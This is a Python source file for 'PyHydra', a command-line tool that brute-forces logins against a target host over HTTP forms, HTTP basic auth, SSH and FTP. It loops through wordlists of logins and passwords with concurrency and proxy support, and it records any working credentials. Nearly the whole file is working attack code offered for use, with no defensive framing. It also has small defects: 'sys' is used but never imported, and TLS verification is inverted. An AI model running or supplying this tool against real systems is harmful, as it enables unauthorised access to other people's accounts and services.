import asyncio
import base64
import ftplib
import json
import os
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import click
import httpx
from rich.console import Console
from tqdm import tqdm
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
console = Console()
def now() -> str:
    return datetime.now().isoformat()
class Finding:
    def __init__(self, host: str, port: int, service: str, login: str, password: str, method: str = ""):
        self.host = host
        self.port = port
        self.service = service
        self.login = login
        self.password = password
        self.method = method
        self.time = now()
    def to_dict(self) -> dict:
        return {"host": self.host, "port": self.port, "service": self.service, "login": self.login, "password": self.password, "method": self.method, "time": self.time}
class PyHydra:
    def __init__(self, target: str, port: int, service: str, logins: List[str], passwords: List[str], threads: int, timeout: float, output: Optional[str], verbose: bool, stop_on_success: bool, proxy: Optional[str], headers: Dict[str, str], path: str, ssl: bool, exit_on_error: bool):
        self.target = target
        self.port = port
        self.service = service
        self.logins = logins
        self.passwords = passwords
        self.threads = threads
        self.timeout = timeout
        self.output = output
        self.verbose = verbose
        self.stop_on_success = stop_on_success
        self.proxy = proxy
        self.headers = headers
        self.path = path
        self.ssl = ssl
        self.exit_on_error = exit_on_error
        self.found: List[Finding] = []
        self.checked = 0
        self.total = len(logins) * len(passwords)
        self.start_time = time.time()
        self.stopped = False
        self.lock = asyncio.Lock()
        self.http_client = None
        if service in ("http-get", "http-post", "http-form"):
            self.http_client = httpx.AsyncClient(http2=True, timeout=httpx.Timeout(timeout), verify=not ssl, limits=httpx.Limits(max_keepalive_connections=50, max_connections=100), proxy=proxy)
    async def __aenter__(self):
        return self
    async def __aexit__(self, exc_type, exc, tb):
        if self.http_client:
            await self.http_client.aclose()
    def _banner(self):
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
        console.print("[bold cyan] PyHydra v1.0 - Login Brute Force Tool[/bold cyan]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
        console.print(f"[cyan]Target:   {self.target}[/cyan]")
        console.print(f"[cyan]Port:     {self.port}[/cyan]")
        console.print(f"[cyan]Service:  {self.service}[/cyan]")
        console.print(f"[cyan]Logins:   {len(self.logins)}[/cyan]")
        console.print(f"[cyan]Passwords: {len(self.passwords)}[/cyan]")
        console.print(f"[cyan]Total:    {self.total}[/cyan]")
        console.print(f"[cyan]Threads:  {self.threads}[/cyan]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
    async def run(self):
        self._banner()
        pbar = tqdm(total=self.total, unit="pairs", desc="brute", ncols=80) if not self.verbose else None
        sem = asyncio.Semaphore(self.threads)
        tasks = []
        for login in self.logins:
            for password in self.passwords:
                tasks.append(self._try_pair(login, password, sem, pbar))
        await asyncio.gather(*tasks)
        if pbar:
            pbar.close()
        self._summary()
        self._save()
    async def _try_pair(self, login: str, password: str, sem: asyncio.Semaphore, pbar: tqdm):
        if self.stopped:
            if pbar:
                pbar.update(1)
            return
        async with sem:
            async with self.lock:
                self.checked += 1
            ok = False
            try:
                if self.service == "http-get":
                    ok = await self._try_http_get(login, password)
                elif self.service in ("http-post", "http-form"):
                    ok = await self._try_http_post(login, password)
                elif self.service == "ssh":
                    ok = await self._try_ssh(login, password)
                elif self.service == "ftp":
                    ok = await self._try_ftp(login, password)
                elif self.service == "http-basic":
                    ok = await self._try_http_basic(login, password)
                else:
                    console.print(f"[red][!] Unknown service: {self.service}[/red]")
                    self.stopped = True
            except Exception as e:
                if self.verbose:
                    console.print(f"[red][-] {login}:{password} -> {e}[/red]")
            if ok:
                async with self.lock:
                    f = Finding(self.target, self.port, self.service, login, password)
                    self.found.append(f)
                    console.print(f"[bold green][+] FOUND: {login} / {password}[/bold green]")
                    if self.stop_on_success:
                        self.stopped = True
            if pbar:
                pbar.update(1)
    async def _try_http_get(self, login: str, password: str) -> bool:
        url = f"{'https' if self.ssl else 'http'}://{self.target}:{self.port}{self.path}"
        params = {"username": login, "password": password}
        r = await self.http_client.get(url, params=params, headers=self.headers)
        return self._check_http_success(r.text, r.status_code)
    async def _try_http_post(self, login: str, password: str) -> bool:
        url = f"{'https' if self.ssl else 'http'}://{self.target}:{self.port}{self.path}"
        data = {"username": login, "password": password}
        r = await self.http_client.post(url, data=data, headers=self.headers)
        return self._check_http_success(r.text, r.status_code)
    async def _try_http_basic(self, login: str, password: str) -> bool:
        url = f"{'https' if self.ssl else 'http'}://{self.target}:{self.port}{self.path}"
        creds = base64.b64encode(f"{login}:{password}".encode()).decode()
        hdrs = dict(self.headers)
        hdrs["Authorization"] = f"Basic {creds}"
        r = await self.http_client.get(url, headers=hdrs)
        return r.status_code == 200
    def _check_http_success(self, body: str, status: int) -> bool:
        fail = ["invalid", "error", "incorrect", "wrong", "denied", "failed", "unauthorized", "login failed", "bad password", "authentication failed"]
        body_lower = body.lower()
        if any(f in body_lower for f in fail):
            return False
        if status in (401, 403):
            return False
        return status == 200
    async def _try_ssh(self, login: str, password: str) -> bool:
        if not HAS_PARAMIKO:
            console.print("[red][!] paramiko not installed. pip install paramiko[/red]")
            self.stopped = True
            return False
        loop = asyncio.get_event_loop()
        def _connect():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port, username=login, password=password, timeout=self.timeout, banner_timeout=self.timeout, auth_timeout=self.timeout)
            client.close()
            return True
        try:
            return await asyncio.wait_for(loop.run_in_executor(None, _connect), timeout=self.timeout + 5)
        except Exception:
            return False
    async def _try_ftp(self, login: str, password: str) -> bool:
        loop = asyncio.get_event_loop()
        def _connect():
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login(login, password)
            ftp.quit()
            return True
        try:
            return await asyncio.wait_for(loop.run_in_executor(None, _connect), timeout=self.timeout + 5)
        except Exception:
            return False
    def _summary(self):
        elapsed = time.time() - self.start_time
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
        if self.found:
            console.print(f"[bold green][+] {len(self.found)} valid credential pair(s) found[/bold green]")
            for f in self.found:
                console.print(f"[green]    {f.login} / {f.password} ({f.service})[/green]")
        else:
            console.print("[yellow][*] No valid credentials found[/yellow]")
        console.print(f"[cyan][*] Checked {self.checked}/{self.total} pairs in {elapsed:.2f}s[/cyan]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
    def _save(self):
        if not self.output:
            return
        data = {"target": self.target, "port": self.port, "service": self.service, "found": [f.to_dict() for f in self.found]}
        ext = os.path.splitext(self.output)[1].lower()
        try:
            if ext == ".json":
                with open(self.output, "w") as f:
                    json.dump(data, f, indent=2)
            else:
                with open(self.output, "w") as f:
                    f.write(f"PyHydra Report for {self.target}:{self.port}\\n")
                    f.write("=" * 50 + "\\n")
                    for finding in self.found:
                        f.write(f"[{finding.service}] {finding.login}:{finding.password}\\n")
            console.print(f"[green][+] Saved to {self.output}[/green]")
        except Exception as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")
def load_list(path: str) -> List[str]:
    if path == "-":
        return [line.strip() for line in sys.stdin if line.strip()]
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
@click.command()
@click.option("-l", "--login", required=True, help="Login name or path to login list file")
@click.option("-p", "--password", required=True, help="Password or path to password list file")
@click.option("-t", "--target", required=True, help="Target host")
@click.option("-s", "--service", default="http-post", help="Service: http-get, http-post, http-form, http-basic, ssh, ftp")
@click.option("--port", type=int, default=0, help="Port (0 = default for service)")
@click.option("--threads", default=8, type=int, help="Concurrent threads")
@click.option("--timeout", default=15.0, type=float, help="Timeout per attempt")
@click.option("-o", "--output", help="Output file")
@click.option("-v", "--verbose", is_flag=True, help="Verbose")
@click.option("-f", "--stop-on-success", is_flag=True, help="Stop after first valid credential")
@click.option("--proxy", help="Proxy URL (HTTP only)")
@click.option("-H", "--header", multiple=True, help="Custom header for HTTP services")
@click.option("--path", default="/", help="URL path for HTTP services")
@click.option("--ssl", is_flag=True, help="Use HTTPS")
@click.option("-e", "--exit-on-error", is_flag=True, help="Exit on connection error")
def cli(login, password, target, service, port, threads, timeout, output, verbose, stop_on_success, proxy, header, path, ssl, exit_on_error):
    logins = load_list(login) if os.path.exists(login) else [login]
    passwords = load_list(password) if os.path.exists(password) else [password]
    default_ports = {"http-get": 80, "http-post": 80, "http-form": 80, "http-basic": 80, "ssh": 22, "ftp": 21}
    if port == 0:
        port = default_ports.get(service, 80)
    if ssl and port == 80 and service.startswith("http"):
        port = 443
    hdrs = {}
    for h in header:
        if ":" in h:
            k, v = h.split(":", 1)
            hdrs[k.strip()] = v.strip()
    hydra = PyHydra(target, port, service, logins, passwords, threads, timeout, output, verbose, stop_on_success, proxy, hdrs, path, ssl, exit_on_error)
    asyncio.run(hydra.run())
if __name__ == "__main__":
    cli()
